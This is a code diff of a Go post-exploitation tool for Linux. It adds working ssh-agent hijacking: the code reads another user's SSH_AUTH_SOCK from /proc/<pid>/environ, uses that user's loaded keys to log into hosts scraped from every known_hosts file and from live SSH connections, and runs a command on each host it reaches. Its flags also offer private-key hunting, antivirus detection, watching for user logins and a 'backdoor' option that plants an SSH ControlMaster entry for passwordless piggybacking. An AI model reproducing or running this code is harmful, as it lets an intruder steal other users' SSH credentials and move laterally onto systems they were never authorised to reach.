@@ -6,46 +6,48 @@ import (
 	"flag"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"os"
 	osuser "os/user"
 	"path/filepath"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 
-	//"golang.org/x/crypto/ssh"
-	//"golang.org/x/crypto/ssh/agent"
 	utmp "github.com/EricLagergren/go-gnulib/utmp"
 	netstat "github.com/drael/GOnetstat"
 	ps "github.com/unixist/go-ps"
 	netlink "github.com/vishvananda/netlink"
 	"github.com/willdonnelly/passwd"
+	"golang.org/x/crypto/ssh"
+	"golang.org/x/crypto/ssh/agent"
 )
 
 // CLI flags
 var (
 	// Passive recon
-	flag_gatt             = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
-	flag_pkeys            = flag.Bool("pkeys", false, "Detect private keys")
-	flag_pkey_dirs        = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
-	flag_pkey_sleep       = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
-	flag_av               = flag.Bool("av", false, "Check for signs of A/V services running or present.")
-	flag_container        = flag.Bool("container", false, "Detect if this system is running in a container. [UNRELIABLE]")
-	flag_net              = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
-	flag_watches          = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
-	flag_arp              = flag.Bool("arp", false, "Grab ARP table for all devices.")
-	flag_who              = flag.Bool("who", false, "List who's logged in and from where.")
+	flag_gatt       = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
+	flag_pkeys      = flag.Bool("pkeys", false, "Detect private keys")
+	flag_pkey_dirs  = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
+	flag_pkey_sleep = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
+	flag_av         = flag.Bool("av", false, "Check for signs of A/V services running or present.")
+	flag_container  = flag.Bool("container", false, "Detect if this system is running in a container. [UNRELIABLE]")
+	flag_net        = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
+	flag_watches    = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
+	flag_arp        = flag.Bool("arp", false, "Grab ARP table for all devices.")
+	flag_who        = flag.Bool("who", false, "List who's logged in and from where.")
 	// Passive recon over time
-	flag_poll_net         = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
-	flag_poll_users       = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
-	flag_stalk_luser      = flag.String("stalk-luser", "", "Wait until a user logs in locally and log it. Use \"*\" to match any user.")
+	flag_poll_net    = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
+	flag_poll_users  = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")
+	flag_stalk_luser = flag.String("stalk-luser", "", "Wait until a user logs in locally and log it. Use \"*\" to match any user.")
 
 	// Active - backdoor
-	flag_ssh_cm           = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
-	flag_rm_ssh_cm        = flag.String("rm-ssh-cm", "", "Undo --ssh-cm. If the config file is empty after the undo, it will be removed.")
+	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
+	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Undo --ssh-cm. If the config file is empty after the undo, it will be removed.")
 	// Active - lateral movement
-	flag_stalk_ruser      = flag.String("stalk-ruser", "", "Wait until a user logs in locally and attempt to also log into that host.")
-	flag_stalk_ruser_cmd  = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host after successful login.")
+	flag_stalk_ruser     = flag.String("stalk-ruser", "", "Wait until a user logs in locally and attempt to also log into that host.")
+	flag_stalk_ruser_cmd = flag.String("stalk-ruser-cmd", "", "Command to execute on remote host after successful login.")
 )
 
 var (
@@ -66,8 +68,9 @@ var (
 
 // string parameter is the user who logged into this system.
 type localLoginStalkAction func(string, netConn) error
+
 // string parameter is the user who logged into a remote system.
-type remoteLoginStalkAction func(string, netConn) error
+type remoteLoginStalkAction func(string) map[string][]sshLoginSuccess
 
 type sshPrivateKey struct {
 	path      string
@@ -75,22 +78,33 @@ type sshPrivateKey struct {
 }
 
 const (
-  L4ProtoTcp = iota
-  L4ProtoUdp = iota
+	L4ProtoTcp = iota
+	L4ProtoUdp = iota
 )
 
 const (
-  L3ProtoIpv4 = iota
-  L3ProtoIpv6 = iota
+	L3ProtoIpv4 = iota
+	L3ProtoIpv6 = iota
 )
 
+type sshLoginSuccess struct {
+	host       Host
+	sock, user string
+}
+
+type NetProto struct {
+	l3, l4 int
+}
+
+type Host struct {
+	ip    string
+	port  int64
+	proto NetProto
+}
 type netConn struct {
-  srcIp    string
-  dstIp    string
-  srcPort  int64
-  dstPort  int64
-  l3Proto  int  // If this is false, connection is ipv6
-  l4Proto  int
+	dst, src Host
+	pid      int // process ID of this network connection, if applicable.
+	proto    NetProto
 }
 
 // watch holds the information for which the system is attempting to detect access.
@@ -220,32 +234,35 @@ func runningProcs(procs []string) []process {
 
 // establishConns grabs currently established network connections
 // and looks for the connection characteristics in "needle".
-func establishedConns(conns []netConn, needle netConn) []netConn {
-  found := []netConn{}
+func establishedConnections(conns []netConn, needle netConn) []netConn {
+	found := []netConn{}
 
-  for _, nc := range conns {
-    if needle.srcIp != "" && needle.srcIp != nc.srcIp {
-      continue
-    }
-    if needle.dstIp != "" && needle.dstIp != nc.dstIp {
-      continue
-    }
-    if needle.srcPort != 0 && needle.srcPort != nc.srcPort {
-      continue
-    }
-    if needle.dstPort != 0 && needle.dstPort != nc.dstPort {
-      continue
-    }
-    if needle.l3Proto != 0 && needle.l3Proto != nc.l3Proto {
-      continue
-    }
-    if needle.l4Proto != 0 && needle.l4Proto != nc.l4Proto {
-      continue
-    }
-    found = append(found, nc)
-  }
+	for _, nc := range conns {
+		if needle.src.ip != "" && needle.src.ip != nc.src.ip {
+			continue
+		}
+		if needle.dst.ip != "" && needle.dst.ip != nc.dst.ip {
+			continue
+		}
+		if needle.src.port != 0 && needle.src.port != nc.src.port {
+			continue
+		}
+		if needle.dst.port != 0 && needle.dst.port != nc.dst.port {
+			continue
+		}
+		if needle.proto.l3 != 0 && needle.proto.l3 != nc.proto.l3 {
+			continue
+		}
+		if needle.proto.l4 != 0 && needle.proto.l4 != nc.proto.l4 {
+			continue
+		}
+		if needle.pid != 0 && needle.pid != nc.pid {
+			continue
+		}
+		found = append(found, nc)
+	}
 
-  return found
+	return found
 }
 
 // getPrivateKey extracts a sshPrivateKey object from a string if a key exists.
@@ -337,7 +354,7 @@ func getArp() []netlink.Neigh {
 
 func isUserLoggedIn(user string) bool {
 	for _, w := range getWho() {
-		if w.user == user {
+		if w.user == user || user == "*" {
 			return true
 		}
 	}
@@ -383,69 +400,153 @@ func getWatches() ([]watch, error) {
 	return found, nil
 }
 
-func getNetworkConnections() []netConn {
-  found := []netConn{}
-
-  for _, conn := range netstat.Tcp() {
-    if conn.State == "ESTABLISHED" {
-      found = append(found, netConn{
-        srcIp: conn.Ip,
-        dstIp: conn.ForeignIp,
-        srcPort: conn.Port,
-        dstPort: conn.ForeignPort,
-        l3Proto: L3ProtoIpv4,
-        l4Proto: L4ProtoTcp,
-      })
-    }
-  }
-  for _, conn := range netstat.Udp() {
-    if conn.State == "ESTABLISHED" {
-      found = append(found, netConn{
-        srcIp: conn.Ip,
-        dstIp: conn.ForeignIp,
-        srcPort: conn.Port,
-        dstPort: conn.ForeignPort,
-        l3Proto: L3ProtoIpv4,
-        l4Proto: L4ProtoUdp,
-      })
-    }
-  }
-  for _, conn := range netstat.Tcp6() {
-    if conn.State == "ESTABLISHED" {
-      found = append(found, netConn{
-        srcIp: conn.Ip,
-        dstIp: conn.ForeignIp,
-        srcPort: conn.Port,
-        dstPort: conn.ForeignPort,
-        l3Proto: L3ProtoIpv6,
-        l4Proto: L4ProtoTcp,
-      })
-    }
-  }
-  for _, conn := range netstat.Udp6() {
-    if conn.State == "ESTABLISHED" {
-      found = append(found, netConn{
-        srcIp: conn.Ip,
-        dstIp: conn.ForeignIp,
-        srcPort: conn.Port,
-        dstPort: conn.ForeignPort,
-        l3Proto: L3ProtoIpv6,
-        l4Proto: L4ProtoUdp,
-      })
-    }
-  }
-
-  return found
+func stringToIntOrZero(s string) int {
+	i, err := strconv.Atoi(s)
+	if err != nil {
+		i = 0
+	}
+	return i
 }
 
-func sshLoginWithAgent(user string, conn netConn) error {
-	return nil
+// getNetworkConnections returns all established tcp/udp ipv4/ipv6 network connections.
+func getNetworkConnections() []netConn {
+	found := []netConn{}
+
+	for _, conn := range netstat.Tcp() {
+		if conn.State == "ESTABLISHED" {
+			found = append(found, netConn{
+				src: Host{
+					ip:   conn.Ip,
+					port: conn.Port,
+				},
+				dst: Host{
+					ip:   conn.ForeignIp,
+					port: conn.ForeignPort,
+				},
+				proto: NetProto{
+					l3: L3ProtoIpv4,
+					l4: L4ProtoTcp,
+				},
+				pid: stringToIntOrZero(conn.Pid),
+			})
+		}
+	}
+	/*
+		for _, conn := range netstat.Udp() {
+			if conn.State == "ESTABLISHED" {
+				found = append(found, netConn{
+					srcIp:   conn.Ip,
+					dstIp:   conn.ForeignIp,
+					srcPort: conn.Port,
+					dstPort: conn.ForeignPort,
+					l3Proto: L3ProtoIpv4,
+					l4Proto: L4ProtoUdp,
+					pid:     stringToIntOrZero(conn.Pid),
+				})
+			}
+		}
+		for _, conn := range netstat.Tcp6() {
+			if conn.State == "ESTABLISHED" {
+				found = append(found, netConn{
+					srcIp:   conn.Ip,
+					dstIp:   conn.ForeignIp,
+					srcPort: conn.Port,
+					dstPort: conn.ForeignPort,
+					l3Proto: L3ProtoIpv6,
+					l4Proto: L4ProtoTcp,
+					pid:     stringToIntOrZero(conn.Pid),
+				})
+			}
+		}
+		for _, conn := range netstat.Udp6() {
+			if conn.State == "ESTABLISHED" {
+				found = append(found, netConn{
+					srcIp:   conn.Ip,
+					dstIp:   conn.ForeignIp,
+					srcPort: conn.Port,
+					dstPort: conn.ForeignPort,
+					l3Proto: L3ProtoIpv6,
+					l4Proto: L4ProtoUdp,
+					pid:     stringToIntOrZero(conn.Pid),
+				})
+			}
+		}
+	*/
+
+	return found
+}
+
+func getSSHSocketByPid(pid int32) (string, error) {
+	var index = 0
+	var name = "SSH_AUTH_SOCK"
+	environ := filepath.Join("/proc", fmt.Sprintf("%d", pid), "environ")
+	body, err := ioutil.ReadFile(environ)
+	if err != nil {
+		return "", fmt.Errorf("Couldn't open %s", environ)
+	}
+	if index = bytes.Index(body, []byte(name)); index == -1 {
+		return "", fmt.Errorf("Env var not found: %s", name)
+	}
+	sub := body[index+len(name)+1:]
+	return string(sub[:bytes.Index(sub, []byte("\x00"))]), nil
+}
+
+func sshLoginWithAgent(user string, host Host, sockPath string) bool {
+	sock, err := net.Dial("unix", sockPath)
+	if err != nil {
+		return false
+	}
+
+	agent := agent.NewClient(sock)
+
+	signers, err := agent.Signers()
+	if err != nil {
+		fmt.Println(err)
+		return false
+	}
+
+	config := &ssh.ClientConfig{
+		User: user,
+		Auth: []ssh.AuthMethod{
+			ssh.PublicKeys(signers...),
+		},
+	}
+
+	// If the destination address is ipv6, wrap it in brackets, otherwise leave it bare.
+	var hostStr = ""
+	if host.proto.l3 == L3ProtoIpv4 {
+		hostStr = host.ip
+	} else {
+		hostStr = fmt.Sprintf("[%s]", host.ip)
+	}
+	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", hostStr, host.port), config)
+	if err != nil {
+		fmt.Printf("Failed to dial: %v", err)
+		return false
+	}
+
+	session, err := client.NewSession()
+	if err != nil {
+		fmt.Printf("Failed to create session: %v", err)
+		return false
+	}
+	defer session.Close()
+
+	var b bytes.Buffer
+	session.Stdout = &b
+	cmd := "hostname"
+	if err := session.Run(cmd); err != nil {
+		fmt.Printf("Failed to run cmd: %s: %v", cmd, err)
+		return false
+	}
+	fmt.Println(b.String())
+	return true
 }
 
 // sshKnownHosts attempts to fetch all the known_hosts files for all users on
 // the system. It will fail in two cases: lack of permission; and hashed hosts.
-func sshKnownHosts() []netConn {
-	found := []netConn {}
+func sshKnownHosts() []Host {
+	found := []Host{}
 	entries, _ := passwd.Parse()
 
 	// Loop over all the users on the system and scrape their known_hosts file
@@ -465,14 +566,40 @@ func sshKnownHosts() []netConn {
 			if strings.Index(line, "|") == 0 { // Hosts may be hashed
 				continue
 			}
-			hosts := strings.Split(line, " ")[0]
-			// Grab all the comma-separated hosts/IPs in the first column. Since known_hosts
-			// doesn't have port information, we'll have to assume tcp/22.
-			for _, host := range strings.Split(hosts, ",") {
-				found = append(found, netConn{
-					dstIp: host,
-					dstPort: 22,
-					l4Proto: L4ProtoTcp,
+
+			// Grab all the comma-separated hosts/IPs in the first column.
+			// Do this twice to first see if any host/IP is ipv6. If so, mark all
+			// hosts as ipv6. Not ideal to loop twice, but eh.
+			endpoints := strings.Split(line, " ")[0]
+			l3Proto := L3ProtoIpv4
+			for _, hostStr := range strings.Split(endpoints, ",") {
+				if strings.Count(hostStr, ":") > 1 {
+					l3Proto = L3ProtoIpv6
+				}
+			}
+
+			for _, hostStr := range strings.Split(endpoints, ",") {
+				host := hostStr
+				port := int64(22)
+
+				// If host has a non-standard port, strip out brackets and grab it
+				rbracket := strings.Index(hostStr, "[")
+				lbracket := strings.Index(hostStr, "]")
+				if rbracket == 0 && lbracket != -1 {
+					host = hostStr[1:lbracket]
+					port, err = strconv.ParseInt(hostStr[strings.LastIndex(hostStr, ":")+1:], 10, 64)
+					if err != nil {
+						// Something's formatted unexpectedly. Skip this line.
+						continue
+					}
+				}
+				found = append(found, Host{
+					ip:   host,
+					port: port,
+					proto: NetProto{
+						l3: l3Proto,
+						l4: L4ProtoTcp,
+					},
 				})
 			}
 		}
@@ -481,15 +608,27 @@ func sshKnownHosts() []netConn {
 	return found
 }
 
-// getCandidateRLogins gets likely list of hosts the user has SSH access to.
-// This basically boils down to getting of a list of established connections to
-// remote hosts on tcp/22.
-func getCandidateRLogins() ([]netConn) {
-  conns := getNetworkConnections()
-  return append(establishedConns(conns, netConn{
-    dstPort: 22,
-    l4Proto: L4ProtoTcp,
-  }), sshKnownHosts()...)
+// getCandidateRHosts gets likely list of hosts the user has SSH access to.
+// This means:
+// a) list of remote hosts currently connected to via SSH. This currently means
+//    established connections to remote hosts on tcp/22. Connections to non-standard
+//    ports aren't detected.
+// b) All the hosts in all the known_hosts files we can find.
+func getCandidateRHosts() []Host {
+	//conns := getNetworkConnections()
+	found := []Host{}
+	conns := []netConn{}
+	conns = establishedConnections(conns, netConn{
+		dst:   Host{port: 22},
+		proto: NetProto{l4: L4ProtoTcp},
+	})
+	for _, conn := range conns {
+		found = append(found, Host{
+			ip:    conn.dst.ip,
+			proto: conn.dst.proto,
+		})
+	}
+	return append(found, sshKnownHosts()...)
 }
 
 func getSSHControlMasterFilename(user string) (string, error) {
@@ -635,52 +774,71 @@ func unsetSSHControlMaster(user string) error {
 // If user == "*", any user will trigger the action.
 func stalkLocalLogin(user string, action localLoginStalkAction) error {
 	start := time.Now()
-	ticker := time.NewTicker(1 * time.Second)
-	//go func() {
+	ticker := time.NewTicker(10 * time.Second)
 	for {
 		select {
 		case <-ticker.C:
 			for _, w := range getWho() {
 				if (user == "*" || user == w.user) && start.Before(time.Unix(int64(w.time), 0)) {
 					action(w.user, netConn{
-							srcIp: w.host,
+						src: Host{ip: w.host},
 					})
 					start = time.Now()
 				}
 			}
-			//ticker.Stop()
 		}
 	}
-	//}()
 	return nil
 }
 
 // stalkRemoteLogin attempts to log into a remote system via two methods:
-// 1. If the Control Master socket is recently created, attempt to use it
-// 2. If an SSH connection to a remote host is made, attempt to use any keys
-//    loaded in the user's ssh-agent.
+// 1. If the presence of an ssh-agent is detected, attempt to use it to log into the same host.
+// 2. [not implemented] If the Control Master socket is recently created, attempt to use it
 func stalkRemoteLogin(user string, action remoteLoginStalkAction) error {
-	ticker := time.NewTicker(1 * time.Second)
-	for {
+	/*
+			ticker := time.NewTicker(1 * time.Minute)
+			for {
 		select {
 		case <-ticker.C:
-			if isUserLoggedIn(user) {
-				for _, c := range getCandidateRLogins() {
-					action(user, netConn{
-							dstIp: c.dstIp,
-							dstPort: c.dstPort,
-					})
+	*/
+	// If the user in question is logged in, attempt to login to any host we know about
+	if isUserLoggedIn(user) {
+		fmt.Println(action(user))
+	}
+	/*
+		}
+		}
+	*/
+	return nil
+}
+
+// attemptRemoteLogin will wait for signs that a user that can be hijacked is logged in.
+// This means either a user with an ssh-agent running or with a ControlMaster socket active.
+func attemptRemoteLogin(user string) map[string][]sshLoginSuccess {
+	hosts := getCandidateRHosts()
+	loggedIn := getWho()
+	found := map[string][]sshLoginSuccess{}
+	for _, host := range hosts {
+		for _, login := range loggedIn {
+			if user == login.user || user == "*" {
+				// Look for an ssh-agent running under this login session
+				fmt.Println(login.pid)
+				sockPath, err := getSSHSocketByPid(login.pid)
+				fmt.Println(err)
+				if err == nil {
+					fmt.Printf("Attempting remote login via ssh-agent as %s to %s:%d\n", user, host.ip, host.port)
+					if sshLoginWithAgent(user, host, sockPath) {
+						found[user] = append(found[login.user], sshLoginSuccess{
+							host: host,
+							sock: sockPath,
+							user: login.user,
+						})
+					}
 				}
 			}
 		}
 	}
-	return nil
-}
-
-// attemptRemoteLogin will wait for signs that 
-func attemptRemoteLogin(user string, conn netConn) error {
-	fmt.Printf("Attempting remote login as %s to %s:%d\n", user, conn.dstIp, conn.dstPort)
-	return nil
+	return found
 }
 
 func main() {
@@ -764,7 +922,8 @@ func main() {
 	}
 	if *flag_stalk_luser != "" {
 		stalkLocalLogin(*flag_stalk_luser, func(user string, conn netConn) error {
-			fmt.Printf("User logged in %v: %s@%s\n", time.Now(), user, conn.srcIp); return nil
+			fmt.Printf("User logged in %v: %s@%s\n", time.Now(), user, conn.src.ip)
+			return nil
 		})
 	}
 	if *flag_stalk_ruser != "" {
